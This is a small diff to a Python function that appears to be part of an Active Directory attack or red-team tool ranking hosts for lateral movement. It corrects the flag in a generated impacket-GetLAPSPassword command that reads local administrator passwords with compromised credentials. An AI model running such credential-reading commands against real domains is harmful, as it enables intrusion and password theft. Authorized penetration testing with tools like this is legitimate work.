@@ -257,7 +257,7 @@ def find_pivot_candidates(
                 vectors.append("LAPS — read local admin password if you can")
                 cmds.append(
                     f"impacket-GetLAPSPassword '<DOMAIN>/<owned_user>:<owned_pass>@<DC_IP>' "
-                    f"-computer-name '{name.split('.')[0]}'"
+                    f"-computer '{name.split('.')[0]}'"
                 )
                 score += 15
             if p.get("unconstraineddelegation"):
